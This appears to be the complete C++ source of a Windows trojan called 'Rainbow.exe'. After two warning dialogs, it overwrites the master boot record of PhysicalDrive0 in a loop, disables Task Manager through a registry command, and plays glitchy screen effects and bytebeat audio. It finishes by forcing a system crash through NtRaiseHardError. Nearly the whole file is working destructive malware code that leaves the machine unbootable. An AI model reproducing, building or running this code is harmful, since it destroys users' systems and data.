#include <windows.h>
#include <windowsx.h>
#include "MBR.h"
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

DWORD WINAPI mbr(LPVOID lpParam) {
    while(1) {
        DWORD dwBytesWritten;
        HANDLE hDisk = CreateFileW(
            L"\\\\.\\PhysicalDrive0",
            GENERIC_ALL,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            0, OPEN_EXISTING, 0, 0
        );
        WriteFile(hDisk, MasterBootRecord, 512, &dwBytesWritten, 0);
        CloseHandle(hDisk);
    }
}

DWORD WINAPI zerotaskmgr(LPVOID lpParam) {
    system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
    return 1;
}

DWORD WINAPI gradient(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    int sw = GetSystemMetrics(0);
    int sh = GetSystemMetrics(1);
    BITMAPINFO bmi = { 40, sw, sh, 1, 24 };
    PRGBTRIPLE rgbtriple;
    for (;;) {
         hdc = GetDC(0);
         HDC hdcMem = CreateCompatibleDC(hdc);
         HBITMAP scr = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbtriple, NULL, NULL);
         SelectObject(hdcMem, scr);
         BitBlt(hdcMem, 0, 0, sw, sh, hdc, 0, 0, SRCCOPY);
         for (int i = 0; i < sw * sh; i++) {
              rgbtriple[i].rgbtRed = (rgbtriple[i].rgbtRed * 2) % (RGB(255, 0, 0));
              rgbtriple[i].rgbtGreen = (rgbtriple[i].rgbtGreen * 2) % (RGB(0, 255, 0));
              rgbtriple[i].rgbtBlue = (rgbtriple[i].rgbtBlue * 2) % (RGB(0, 0, 255));
         }
         BitBlt(hdc, 0, 0, sw, sh, hdcMem, 0, 0, SRCCOPY);
         ReleaseDC(0, hdc);
         DeleteDC(hdc);
         DeleteDC(hdcMem);
         DeleteObject(scr);
         DeleteObject(rgbtriple);
         DeleteObject(&sw);
         DeleteObject(&sh);
         DeleteObject(&bmi);
    }
}

DWORD WINAPI colorful(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    int sw = GetSystemMetrics(0);
    int sh = GetSystemMetrics(1);
    BITMAPINFO bmi = { 40, sw, sh, 1, 24 };
    PRGBTRIPLE rgbtriple;
    for (;;) {
         hdc = GetDC(0);
         HDC hdcMem = CreateCompatibleDC(hdc);
         HBITMAP scr = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbtriple, NULL, NULL);
         SelectObject(hdcMem, scr);
         BitBlt(hdcMem, 0, 0, sw, sh, hdc, 0, 0, SRCCOPY);
         for (int i = 0; i < sw * sh; i++) {
              int x = i % sw;
              int y = i / sh;
              int t = y ^ y | x;
              rgbtriple[i].rgbtRed += GetRValue(x) & t ^ y;
              rgbtriple[i].rgbtGreen += GetGValue(x) & t ^ y;
              rgbtriple[i].rgbtBlue += GetBValue(x) & t ^ y;
         }
         BitBlt(hdc, 0, 0, sw, sh, hdcMem, 0, 0, SRCCOPY);
         ReleaseDC(0, hdc);
         DeleteDC(hdc);
         DeleteDC(hdcMem);
         DeleteObject(scr);
         DeleteObject(rgbtriple);
         DeleteObject(&sw);
         DeleteObject(&sh);
         DeleteObject(&bmi);
    }
}

DWORD WINAPI flash(LPVOID lpParam) {
    while(1) {
        HDC hdc = GetDC(0);
        int x = GetSystemMetrics(0);
        int y = GetSystemMetrics(1);
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, brush);
        PatBlt(hdc, 0, 0, x, y, PATINVERT);
        ReleaseDC(0, hdc);
        DeleteObject(brush);
        Sleep(10);
    }
}

DWORD WINAPI rainbowTextz(LPVOID lpParam) {
    while(1) {
        HDC hdc = GetDC(0);
        int sx = GetSystemMetrics(0);
        int sy = GetSystemMetrics(1);
        LPCWSTR lpText = L"RAINBOW!";
        SetBkColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        TextOutW(hdc, rand() % sx, rand() % sy, lpText, wcslen(lpText));
        ReleaseDC(0, hdc);
        DeleteDC(hdc);
    }
}

DWORD WINAPI rainbowGeo(LPVOID lpParam) {
    while(1) {
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        HDC hdc = GetDC(0);
        HPEN hPen = CreatePen(PS_SOLID, 2, RGB(rand() % 255, rand() % 255, rand() % 255));
        HPEN oldPen = SelectPen(hdc, hPen);

        HBRUSH hBrush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        HBRUSH oldBrush = SelectBrush(hdc, hBrush);

        POINT vertices[] = { { rand() % w, rand() % h}, { rand() % w, rand() % h}, { rand() % w, rand() % h} };
        Polygon(hdc, vertices, sizeof(vertices) / sizeof(vertices[0]));

        SelectBrush(hdc, oldBrush);
        DeleteObject(hBrush);

        SelectPen(hdc, oldPen);
        DeleteObject(hPen);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI train(LPVOID lpParam) {
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    while(1) {
        HDC hdc = GetDC(0);
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, brush);
        BitBlt(hdc, 0, 0, w, h, hdc, -30, 0, 0x1900ac010e);
        BitBlt(hdc, 0, 0, w, h, hdc, w - 30, 0, 0x1900ac010e);
        BitBlt(hdc, 0, 0, w, h, hdc, 0, -30, 0x1900ac010e);
        BitBlt(hdc, 0, 0, w, h, hdc, 0, h - 30, 0x1900ac010e);
        DeleteObject(brush);
        ReleaseDC(0, hdc);
    }
}

VOID WINAPI sound1() {
   HWAVEOUT hWaveOut = 0;
   WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
   waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
   char buffer[8000 * 30] = {};
   for (DWORD t = 0; t < sizeof(buffer); ++t) {
        buffer[t] = static_cast<char>(t*((t&4096?t%65536<59392?7:t>>6:16)+(1&t>>14))>>(3&-t>>(t&2048?2:10))|t>>(t&16384?t&4096?4:3:2));
   }

   WAVEHDR header = { buffer, sizeof(buffer) };
   waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutClose(hWaveOut);
}

VOID WINAPI sound2() {
   HWAVEOUT hWaveOut = 0;
   WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
   waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
   char buffer[8000 * 30] = {};
   for (DWORD t = 0; t < sizeof(buffer); ++t) {
        buffer[t] = static_cast<char>(2*(t>>5&t)-(t>>5)+t*(t>>14&14));
   }

   WAVEHDR header = { buffer, sizeof(buffer) };
   waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutClose(hWaveOut);
}

VOID WINAPI sound3() {
   HWAVEOUT hWaveOut = 0;
   WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
   waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
   char buffer[8000 * 30] = {};
   for (DWORD t = 0; t < sizeof(buffer); ++t) {
        buffer[t] = static_cast<char>(t*(0xCA98CA98>>(t>>9&30)&15)|t>>8);
   }

   WAVEHDR header = { buffer, sizeof(buffer) };
   waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutClose(hWaveOut);
}

VOID WINAPI sound4() {
   HWAVEOUT hWaveOut = 0;
   WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
   waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
   char buffer[8000 * 30] = {};
   for (DWORD t = 0; t < sizeof(buffer); ++t) {
        buffer[t] = static_cast<char>(t*(t>>9&10|t>>11&24^t>>10&15&t>>15));
   }

   WAVEHDR header = { buffer, sizeof(buffer) };
   waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutClose(hWaveOut);
}

VOID WINAPI sound5() {
   HWAVEOUT hWaveOut = 0;
   WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
   waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
   char buffer[8000 * 30] = {};
   for (DWORD t = 0; t < sizeof(buffer); ++t) {
        buffer[t] = static_cast<char>((t>>6|t<<1)+(t>>5|t<<3|t>>3)|t>>2|t<<1);
   }

   WAVEHDR header = { buffer, sizeof(buffer) };
   waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutClose(hWaveOut);
}

VOID WINAPI sound6() {
   HWAVEOUT hWaveOut = 0;
   WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
   waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
   char buffer[8000 * 30] = {};
   for (DWORD t = 0; t < sizeof(buffer); ++t) {
        buffer[t] = static_cast<char>(t|t%255|t%257);
   }

   WAVEHDR header = { buffer, sizeof(buffer) };
   waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
   waveOutClose(hWaveOut);
}

int main() {
    if (MessageBoxW(NULL, L"This program you are running is considered trojan and will cause your computer to become unbootable!", L"Rainbow.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
        ExitProcess(0);
    } else {
        if (MessageBoxW(NULL, L"Oh, so you're running it huh? Well, just remember that i warn you and PLEASE make sure all your files are backup\nTHE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGES CAUSED BY THIS TROJAN", L"Rainbow.exe - LAST WARNING", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
            ExitProcess(0);
        } else {
            CreateThread(0, 0, mbr, 0, 0, 0);
            CreateThread(0, 0, zerotaskmgr, 0, 0, 0);
            Sleep(2000);
            HANDLE thread1 = CreateThread(0, 0, gradient, 0, 0, 0);
            sound1();
            Sleep(30000);
            TerminateThread(thread1, 0);
            CloseHandle(thread1);
            Sleep(100);
            HANDLE thread2 = CreateThread(0, 0, colorful, 0, 0, 0);
            sound2();
            Sleep(30000);
            TerminateThread(thread2, 0);
            CloseHandle(thread2);
            Sleep(100);
            HANDLE thread3 = CreateThread(0, 0, flash, 0, 0, 0);
            sound3();
            Sleep(30000);
            TerminateThread(thread3, 0);
            CloseHandle(thread3);
            Sleep(100);
            HANDLE thread4 = CreateThread(0, 0, rainbowTextz, 0, 0, 0);
            sound4();
            Sleep(30000);
            TerminateThread(thread4, 0);
            CloseHandle(thread4);
            Sleep(100);
            HANDLE thread5 = CreateThread(0, 0, rainbowGeo, 0, 0, 0);
            sound5();
            Sleep(30000);
            TerminateThread(thread5, 0);
            CloseHandle(thread5);
            Sleep(100);
            HANDLE thread6 = CreateThread(0, 0, train, 0, 0, 0);
            sound6();
            Sleep(30000);
            BOOLEAN bl;
            DWORD response;
            NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
            RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
            RtlAdjustPrivilege(19, 1, 0, &bl);
            NtRaiseHardError(0xC0000005, 0, 0, 0, 6, &response);
            Sleep(-1);
        }
    }
}